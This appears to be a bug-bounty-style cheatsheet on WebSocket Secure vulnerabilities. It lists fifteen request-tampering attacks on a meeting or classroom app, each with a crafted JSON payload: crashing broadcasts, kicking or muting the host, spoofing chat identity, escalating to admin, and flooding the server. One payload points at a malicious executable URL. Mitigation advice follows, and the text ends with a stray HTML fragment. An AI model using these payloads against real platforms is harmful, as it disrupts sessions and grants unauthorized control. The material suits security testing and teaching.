# WSS (WebSocket Secure) Cheatsheet

## What is WSS?

WSS (WebSocket Secure) is an encrypted communication protocol that builds upon the WebSocket protocol. It is used to establish secure, persistent, full-duplex connections between clients and servers over HTTPS.

This protocol is widely used in applications that require real-time data exchange, such as:

- **Chat applications**: Delivering instant messages without delays.
- **Live streaming**: Enabling low-latency video or audio streams.
- **Real-time dashboards**: Providing up-to-the-moment updates for stock markets, analytics, or monitoring tools.

The WSS protocol ensures that all communication between the client and server is encrypted, protecting the data from being intercepted by unauthorized parties.

---

## WSS Vulnerabilities

WSS is often used in applications that rely on real-time communication, such as live streaming platforms, private meeting rooms, and chat systems. These applications depend on WebSockets rather than traditional HTTP traffic, making them a potential vector for unique vulnerabilities. Below are 15 practical examples of WSS vulnerabilities, including steps to reproduce and their impact.

---

### #1 How a Single Vulnerability Crashes Live Broadcasts

**Description**: A crafted WebSocket request causes a denial of service for live broadcasts.

**Steps to Reproduce**:
1. Log in as an admin and assign a moderator to a classroom.
2. Intercept the API request for role assignment and modify the payload:

```json
{
  "request_type": "ASSIGN ROLE",
  "payload": {
    "role": "crash",
    "user_id": "55150"
  },
  "request_id": "A1Kptpj0FIfef173-biAa"
}
```

3. Send the modified request.
4. Observe that all live broadcasts in the session crash.

---

### #2 Moderator Privilege Exploit: Kicking the Host

**Description**: A moderator can kick the host by crafting WebSocket requests with the host's `connection_id`.

**Steps to Reproduce**:
1. Intercept WebSocket traffic as a moderator.
2. Extract the host's `connection_id`.
3. Craft and send a WebSocket request:

```json
{
  "request_type": "KICK",
  "payload": {
    "connection_id": "usr-conn-1ef9c55xu"
  },
  "request_id": "dME5ScO1R4kLK_STnmfUQ"
}
```

4. Verify that the host is removed from the session.

---

### #3 Privilege Escalation: Demoting and Removing the Host

**Description**: A moderator can demote the host to a lower role and remove them from the session.

**Steps to Reproduce**:
1. Log in as a moderator and intercept WebSocket traffic.
2. Modify a WebSocket request:

```json
{
  "request_type": "ASSIGN ROLE",
  "payload": {
    "role": "Participant",
    "user_id": "54992"
  },
  "request_id": "PasQjmdXxPzvb63AGqyU-"
}
```

3. Send the modified request to demote the host.
4. Use the "Remove Participant" feature to remove the host.

---

### #4 Unauthorized Document Sharing

**Description**: Low-level participants can initiate document sharing, disrupting broadcasts.

**Steps to Reproduce**:
1. Join a session as a participant.
2. Send the following payload:

```json
{
  "request_type": "START DOC SHARING",
  "payload": {
    "doc_url": "https://test.com/files/file1",
    "doc_id": "file1",
    "presenter_page": 1
  },
  "request_id": "ziwi9wH0-RvzS5Il6sEPn"
}
```

3. Observe document sharing being initiated.

---

### #5 Storyboard Manipulation

**Description**: Unauthorized users can retrieve, add, or delete Storyboard entries.

**Steps to Reproduce**:
1. Retrieve entries:

```http
GET /api/test/activities/?offset=0&limit=999&room_id=room-<id>
```

2. Add an entry:

```json
{
  "link": "https://youtube.com/video",
  "tag": "youtube",
  "room": "room-<id>",
  "meta": {}
}
```

3. Delete an entry:

```http
DELETE /api/test/activities/<activity_id>/
```

---

### #6 Reuse of Captured WebSocket Requests

**Description**: Removed users can reuse WebSocket requests to disrupt sessions.

**Steps to Reproduce**:
1. Capture WebSocket requests before removal.
2. Send captured requests (e.g., raise hand):

```json
{
  "request_type": "PATCH SELF",
  "payload": {"hand": 1733531882315},
  "request_id": "29F7QIgAysobak3Pi-JRh"
}
```

---

### #7 Breakout Room Information Leak

**Description**: Participants can view breakout room details via WebSocket traffic.

**Steps to Reproduce**:
1. Monitor WebSocket traffic.
2. Observe responses containing room details:

```json
{
  "breakout_rooms": [
    {"id": "room1", "name": "Room 1"},
    {"id": "room2", "name": "Room 2"}
  ]
}
```

---

### #8 Unauthorized Timer Control

**Description**: Participants can start a timer, affecting all users.

**Steps to Reproduce**:
1. Send a WebSocket request:

```json
{
  "request_type": "START TIMER",
  "payload": {"seconds": 2525},
  "request_id": "ARS03V3_QppyiuwZ9daJ"
}
```

---

### #9 Unauthorized Session Information Disclosure

**Description**: Unauthorized users can view session details such as usernames and IDs.

**Steps to Reproduce**:
1. Monitor WebSocket traffic from an unapproved account.
2. Observe session-related updates:

```json
{
  "type": "online_sessions_info_update",
  "data": {"online_count": 2, "nicknames": ["User1", "User2"]}
}
```

---

### #10 Moderator Muting Host Microphone

**Description**: Moderators can mute the host's microphone without authorization.

**Steps to Reproduce**:
1. Intercept WebSocket traffic.
2. Craft a mute request:

```json
{
  "request_type": "MUTE",
  "payload": {
    "connection_id": "usr-conn-8o2spgmab",
    "device_type": "MIC"
  },
  "request_id": "9UbgHwHILYAtDeVjD_Alr"
}
```

---

### #11 Chat Injection Vulnerability

**Description**: Unauthorized users can send chat messages as others.

**Steps to Reproduce**:
1. Capture a chat WebSocket request.
2. Modify the `nickname` and resend:

```json
{
  "request_type": "SEND MESSAGE",
  "payload": {
    "nickname": "Admin",
    "message": "Unauthorized message"
  },
  "request_id": "msg12345"
}
```

---

### #12 Insecure File Sharing

**Description**: Participants can upload unauthorized files.

**Steps to Reproduce**:
1. Craft a file upload request:

```json
{
  "request_type": "UPLOAD FILE",
  "payload": {
    "file_url": "https://malicious.com/file.exe"
  },
  "request_id": "upload123"
}
```

---

### #13 Session Hijacking via Token Replay

**Description**: Replaying session tokens allows unauthorized access.

**Steps to Reproduce**:
1. Capture session tokens.
2. Replay tokens in a new WebSocket connection.

---

### #14 Overloading the Server

**Description**: Sending repeated large payloads causes server crashes.

**Steps to Reproduce**:
1. Send large payloads repeatedly:

```json
{
  "request_type": "SPAM",
  "payload": {"data": "x" * 1000000},
  "request_id": "spam123"
}
```

---

### #15 Unauthorized Role Escalation

**Description**: Participants can escalate their roles to admin.

**Steps to Reproduce**:
1. Modify a WebSocket request:

```json
{
  "request_type": "ASSIGN ROLE",
  "payload": {
    "role": "Admin",
    "user_id": "participant123"
  },
  "request_id": "rolechange123"
}
```

---

### Mitigation Recommendations

1. **Access Control**: Enforce strict role-based permissions.
2. **Input Validation**: Validate all incoming WebSocket payloads.
3. **Token Expiry**: Use short-lived session tokens.
4. **Rate Limiting**: Limit the number of requests per user.
5. **Logging and Monitoring**: Monitor WebSocket activity for anomalies.
h1>1</h1>
